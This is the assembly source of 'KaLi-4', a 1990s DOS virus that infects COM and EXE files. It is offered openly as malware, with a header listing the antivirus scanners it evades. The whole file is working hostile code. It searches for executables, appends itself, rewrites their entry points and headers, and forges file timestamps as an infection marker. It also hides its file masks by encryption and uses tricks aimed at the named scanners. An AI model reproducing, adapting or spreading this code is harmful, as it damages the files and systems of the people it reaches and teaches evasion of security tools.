;ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐ
; KaLi-4.ASM  
; AUTHOR:  K”hntark
; DATE:    18 June 1993 / updated March 1994
; Size:    approx. <  500 bytes
; EXE,COM Anti-heuristics infector. 
;
; Undetected by TBSCAN 6.11 hr mode (no flags!)
; Undetected by F-PROT 2.11 normal and /analyse modes
; Undetected by Antiviral Toolkit Pro 1.07
; Undetected by Central Point Antivirus 2.1 normal and analyse modes
;
;ฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐฐ

MAIN    SEGMENT BYTE
        ASSUME cs:main,ds:main,ss:nothing      ;all part in one segment=com file
        ORG    100h

;**********************************
;  fake host program
;**********************************

HOST:
        db    0E9h,0Ah,00          ;jmp    NEAR PTR VIRUS
        db     ' '
        db     090h,090h,090h
        mov    ah,4CH
        mov    al,0
        int    21H                 ;terminate normally with dos

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

;**********************************
; VIRUS CODE STARTS HERE
;**********************************

VIRUS:                   
      
      mov si,010Dh                            ;get starting address

;************************************           
; Fix DS=CS ES=CS
;************************************
   
   mov  al,cs:BYTE PTR [si + COM_FLAG - VIRUS]
   push ax 
   push es                                    ;save es and ds in case file is EXE
   push ds
   
   push cs                                    
   push cs
   pop  es                                    ;es = cs
   pop  ds                                    ;ds = cs
   
   push WORD PTR [si + ORIG_IPCS - VIRUS]          ;save IP
   push WORD PTR [si + ORIG_IPCS - VIRUS + 2]      ;save CS
   
   push WORD PTR [si + ORIG_SSSP - VIRUS]          ;save SS
   push WORD PTR [si + ORIG_SSSP - VIRUS + 2]      ;save SP
   
   push WORD PTR [si + START_CODE - VIRUS]      
   push WORD PTR [si + START_CODE - VIRUS + 2]
           
;************************************           
; redirect DTA onto virus code
;************************************
           
   mov  ah,1ah               ;set new DTA function to ds:dx
   lea  dx,[si+ DTA - VIRUS] ;put DTA at the end of the virus for now
   int  21h

;************************************
; Decrypt Encrypted Strings
;************************************
          
          push si
          cld
          mov cx,6d ;12 bytes
          mov di,si
          add di,COM_MASK - VIRUS
          add si,CRYPTED_STRINGS - VIRUS
DIE:          
          movsw
          not WORD PTR [di-2]
          loop DIE
          pop  si

;************************************
; MAIN Routines called from here           
;************************************

          lea  dx,[si + COM_MASK - VIRUS] 
          call FIND_FILE                  ;get a com file to attack!
          lea  dx,[si + EXE_MASK - VIRUS] 
          call FIND_FILE                  ;get an exe file to attack!
                                   
;=cut=here===============================================================================

           lea  dx,[si + DTA_File_Name - VIRUS]                 ;display the name of the file NOT
           mov  BYTE PTR [si + DTA_File_Name - VIRUS + 13],'$' 
           mov  ah,09
           int  21h                                           ;display file name

;=cut=here===============================================================================
;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

EXIT_VIRUS:
           
;************************************
; set old  DTA  address
;************************************

           mov dx,80h            ;fix dta back to ds:dx
           mov ah,1ah
           int 21h               ;host program
   
           pop WORD PTR [si + START_CODE - VIRUS + 2]
           pop WORD PTR [si + START_CODE - VIRUS]
   
           pop WORD PTR [si + ORIG_SSSP - VIRUS + 2]      ;restore SP
           pop WORD PTR [si + ORIG_SSSP - VIRUS]          ;restore SS

           pop WORD PTR [si + ORIG_IPCS - VIRUS + 2]      ;restore CS
           pop WORD PTR [si + ORIG_IPCS - VIRUS]          ;restore IP

           pop ds                ;restore ds
           pop es                ;restore es
           pop ax                ;restore COM_FLAG
             
           cmp  al,00            ;com infection?
           je  RESTORE_COM
   
;************************************           
; restore EXE.. and exit..
;************************************
   
   mov  bx,ds                                       ;ds has to be original one
   add  bx,low 10h
   mov  cx,bx
   add  bx,cs:WORD PTR [si + ORIG_SSSP - VIRUS]     ;restore ss
   cli
   mov  ss,bx
   mov  sp,cs:WORD PTR [si + ORIG_SSSP - VIRUS + 2] ;restore sp   
   sti
   add  cx,cs:WORD PTR [si + ORIG_IPCS - VIRUS+ 2]
   push cx                                          ;push cs
   push cs:WORD PTR [si + ORIG_IPCS - VIRUS]        ;push ip
   db  0CBh                                         ;retf

;************************************           
; restore 4 original bytes to file
;************************************

RESTORE_COM:           

           cld                                    ;clear direction flag
           push si                                ;save si
           mov  di,0100h
           add  si,START_CODE -  VIRUS
           movsw                                  ;shorter & faster than
           movsw                                  ;mov cx,04  and rep movsb
           pop  si                                ;restore si

;****************************************************************
; zero out registers for return to
; host program
;****************************************************************

 mov  ax,0FEFFh     ;ANTI-TBSCAN B flag trick
 not  ax            ;ax becomes 0100h
 push ax
 xor  ax,ax
 cwd
 xor  di,di
 xor  si,si
 xor  bx,bx
 xor  cx,cx
 ret  

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

FIND_FILE:
                mov  cx,3Fh   ;search for any file, with any attributes
                mov  ah,4Eh   ;do DOS search 1st function file mask a dx

NEXT_FILE:
                int  21h
                jc   NO_MO               ;return if not zero
                call CHECK_N_INFECT_FILE ;check file if file found
                mov  ah,4Fh              ;file no good..find next function
                jmp  short NEXT_FILE     ;test next file for validity

NO_MO:
                ret

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

NO_GOOD:     jmp GET_OUT

;-----------------------------------------------------------------------------

CHECK_N_INFECT_FILE:

;******************
; 1-Check Date ID
;******************
           
           mov cx,WORD PTR [si + DTA_File_Time - VIRUS]
           and cl,1Dh
           cmp cl,1Dh
           je  NO_MO

;*********************************************
; 2-Set attributes
;*********************************************
       
       mov ax,4301h     ;set file attributes to cx
       xor cx,cx        ;set attributes to normal
       lea dx,[si + DTA_File_Name - VIRUS]
       int 21h          ;int 21h
       jc  NO_MO        ;error.. quit

;*****************
; 3-OPEN FILE
;*****************

            mov  ax,3D02h     ;r/w access to it
            int  21h         
            jc   NO_GOOD      ;error.. quit
            xchg ax,bx        ;bx = file handle

;********************
; 4-Read 1st 28 bytes
;********************
            
            mov  ah,3Fh                          ;DOS read function
            mov  cx,28d                          ;read first 5 bytes of file
            lea  dx,[si + START_CODE - VIRUS]    ;store'em here
            int  21h
            jc   NO_GOOD                         ;error? get next file

;*********************
; 5-CHECK FILE
;*********************
            
            mov  ax,0A5B2h
            not  ax                                      ;becomes ZM
            cmp  WORD PTR [si + START_CODE - VIRUS],ax   ;EXE file?
            je   CHECK_EXE                               ;no? check com
            
            mov  cl,8
            ror  ax,cl                                   ;becomes MZ
            cmp  WORD PTR [si + START_CODE - VIRUS],ax   ;EXE file?
            je   CHECK_EXE                               ;no? check com
            
CHECK_COM:
            mov  ax,WORD PTR [si + DTA_File_Size - VIRUS] ;get file's size
            
            push ax                               ;insert new entry point just in case..
            add  ax,100h 
            mov  WORD PTR [si + 1],ax 
            pop  ax

            add  ax,OFFSET FINAL - OFFSET VIRUS              ;add virus size to it
            jc   NO_GOOD                                     ;bigger then 64K:nogood
            
            cmp  BYTE PTR [si + START_CODE - VIRUS],0E9H     ;compare 1st byte to near jmp
            jne  short INFECT_COM                                               ;not a near jmp, file ok

            cmp  BYTE PTR [si + START_CODE+3 - VIRUS],20h    ;check for ' '
            je   NO_GOOD                                     ;file ok .. infect
            jmp  short  INFECT_COM

CHECK_EXE:
            
            cmp  WORD PTR [si + START_CODE - VIRUS + 18h],40h ;Windows file?
            je   NO_GOOD                                      ;no? check com
            
            cmp  WORD PTR [si + START_CODE - VIRUS + 01Ah],0   ;internal overlay
            jne  NO_GOOD                                       ;yes? exit..
            
            cmp  WORD PTR [si + START_CODE - VIRUS + 12h],ID   ;already infected?
            je   NO_GOOD
            
INFECT_EXE:
             mov BYTE PTR [si+ COM_FLAG - VIRUS],01  ;exe infection
             jmp short SKIP

INFECT_COM:
             mov BYTE PTR [si+ COM_FLAG - VIRUS],00  ;com infection

SKIP:

;*********************        
; 6-set PTR @EOF
;*********************

        xor  cx,cx                  ;prepare to write virus on file
        xor  dx,dx                  ;position file pointer,cx:dx = 0
       ;cwd                         ;position file pointer,cx:dx = 0
        mov  ax,4202H
        int  21h                    ;locate pointer at end EOF DOS function
        
        
        cmp BYTE PTR [si+ COM_FLAG - VIRUS],01 ;exe file?
        jne DO_COM

;*************************        
; 7-FIX AND WRITE EXE HDR
;*************************
        
        push bx                                ;save file handler

;-----------------------
; save CS:IP & SS:SP
;-----------------------

        push si
        cld                                    ;clear direction flag
        lea di,[si + ORIG_SSSP - VIRUS]        ;save original CS:IP at es:di
        lea si,[si + START_CODE - VIRUS + 14d] ;from ds:si
        movsw                                  ;save ss
        movsw                                  ;save sp

        add si,02                              ;save original SS:SP        
        movsw                                  ;save ip
        movsw                                  ;save cs
        pop si

;-----------------------------
; calculate new CS:IP 
;-----------------------------

        mov  bx,WORD PTR[si + START_CODE - VIRUS + 8]  ;header size in paragraphs
        mov  cl,04    ;multiply by 16, won't work with headers > 4096
        shl  bx,cl    ;bx=header size

        push ax       ;save file size at dx:ax
        push dx

        sub  ax,bx    ;file size - header size
        sbb  dx,0000h ;fix dx if carry           assures dx, ip < 16

        call CALCULATE ;=> mov cx,0010h, div cx

        mov  WORD PTR [si+ START_CODE - VIRUS + 12h],ID   ;put ID in checksum slot
        mov  WORD PTR [si+ START_CODE - VIRUS + 14h],ax   ;IP
        mov  WORD PTR [si+1],ax                           ;insert new starting address
        mov  WORD PTR [si+ START_CODE - VIRUS + 16h],dx   ;CS
        
;-----------------------------
; calculate & fix new SS:SP
;-----------------------------
        
        pop dx
        pop ax ;filelength in dx:ax

        add ax,OFFSET FINAL - OFFSET VIRUS ;add filesize to ax
        adc dx,0000h                       ;fix dx if carry

        push ax
        push dx
        add  ax,40h   ;if filesize + virus size is even then the stack size
        test al,01    ;even or odd stack?
        jz   EVENN
        inc  ax       ;make stack even
EVENN:
        call CALCULATE ;=> mov cx,0010h, div cx

        mov  WORD PTR [si+ START_CODE - VIRUS + 10h],ax ;SP
        mov  WORD PTR [si+ START_CODE - VIRUS + 0Eh],dx ;SS

;-----------------------------
; Calculate new file size
;-----------------------------

        pop dx
        pop ax
        
        push  ax
        mov   cl,0009h                       ;2^9 = 512
        ror   dx,cl                          ;/ 512 (sort of)
        shr   ax,cl                          ;/ 512
        stc                                  ;set carry flag
        adc   dx,ax                          ;fix dx , page count
        pop   cx
        and   ch,0001h                       ;mod 512

        mov  WORD PTR [si+ START_CODE - VIRUS + 4],dx ;page count
        mov  WORD PTR [si+ START_CODE - VIRUS + 2],cx ;save remainder

        pop  bx      ;restore file handle      

DO_COM:
        
;*********************        
; 8-Write Virus
;*********************
        
        mov  cx,OFFSET FINAL - OFFSET VIRUS      ;write virus  cx= # bytes
        mov  ah,42h                              ;<-anti CPAV 2.1 F-code trick
        mov  dx,si                               ;write from start
        sub  ah,2                                ;<-anti CPAV 2.1 F-code trick
        int  21h

;*********************        
; 9-set PTR @BOF
;*********************

        xor  cx,cx                           
        xor  dx,dx                        ;position file pointer,cx:dx = 0
       ;cwd                               ;position file pointer,cx:dx = 0
        mov  ax,4200h                     ;locate pointer at beginning of
        int  21h                          ;host file
        
        cmp BYTE PTR [si+ COM_FLAG  - VIRUS],01 ;exe file?
        jne DO_COM2
        
;*********************        
; 10-Write EXE Header
;*********************

        mov  cx,26d                                           ;#of bytes to write
        lea  dx,[si+OFFSET START_CODE - OFFSET VIRUS]         ;ds:dx=pointer of data to write
        jmp  short CONT

DO_COM2:

;*************************************************
; 11-write new 4 bytes to beginning of file (COM)
;*************************************************
        
        mov  ax,WORD PTR [si + DTA_File_SIZE - VIRUS]
        sub  ax,3
        mov  WORD PTR [si + START_IMAGE+1 - VIRUS],ax
        
        mov  cx,4                                 ;#of bytes to write
        lea  dx,[si+ START_IMAGE -  VIRUS]        ;ds:dx=pointer of data to write
CONT:        
        mov  ah,40h                               ;DOS write function
        int  21h                                  ;write 5 / 28 bytes

;*************************************************        
; 12-Restore date and time of file to be infected
;*************************************************

        mov  ax,4200h                             ;anti-TBSCAN trick
        mov  dx,WORD PTR [si + DTA_File_DATE - VIRUS]
        mov  cx,WORD PTR [si + DTA_File_TIME - VIRUS]
        and  cx,0FFE0h                             ;mask all but seconds
        or   cl,1Dh                                ;seconds to 58
        add  ax,1501h                              ;ax becomes 5701h
        int  21h

GET_OUT:

;****************        
; 13-Close File
;****************

        mov  ah,3Eh
        int  21h                       ;close file

;*************************************************        
; 14-Restore file's attributes
;*************************************************
       
       mov ax,4202h                                   ;set file attributes to cx
       lea dx,[si + DTA_File_NAME - VIRUS]            ;get filename
       xor cx,cx
       mov cl,BYTE PTR [si + DTA_File_ATTR - VIRUS]   ;get old attributes
       add ax,0FFh                                    ;ax becomes 4301h
       int 21h
       ret                                            ;infection done!

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ
        
CALCULATE:
        mov cl,0Ch
        shl dx,cl     ;dx * 4096
        mov bx,ax
        mov cl,4
        shr bx,cl     ;ax / 16
        add dx,bx     ;dx = dx * 4096 + ax / 16 =SS CS
        and ax,0Fh    ;ax = ax and 0Fh          =SP IP
        ret 

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

NAME_AUTHOR     db  'KaLi-4 / K”hntark'

CRYPTED_STRINGS db  0D5h,0D1h,0BCh,0B0h,0B2h,0FFh  ;'*.COM',0
                db  0D5h,0D1h,0BAh,0A7h,0BAh,0FFh  ;'*.EXE',0

START_IMAGE     db  0E9h,0,0,020h

ORIG_SSSP       dw  0,0
ORIG_IPCS       dw  0,0
COM_FLAG        db  0                   ;0=COM 1=EXE
START_CODE      db  4 dup (0)           ;4 bytes of COM or EXE hdr goes here

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

FINAL:                ;label of byte of code to be kept in virus when it moves

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

HEAP:

START_CODE2     db  24d dup (0)         ;2nd part of EXE hdr

COM_MASK        db  0,0,0,0,0,0 
EXE_MASK        db  0,0,0,0,0,0

DTA             db 21 dup(0)  ;reserved
DTA_File_Attr   db ?
DTA_File_Time   dw ?
DTA_File_Date   dw ?
DTA_File_Size   dd ?
DTA_File_Name   db 13 dup(0)

;อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

ID equ 77h

MAIN ENDS
     END    HOST



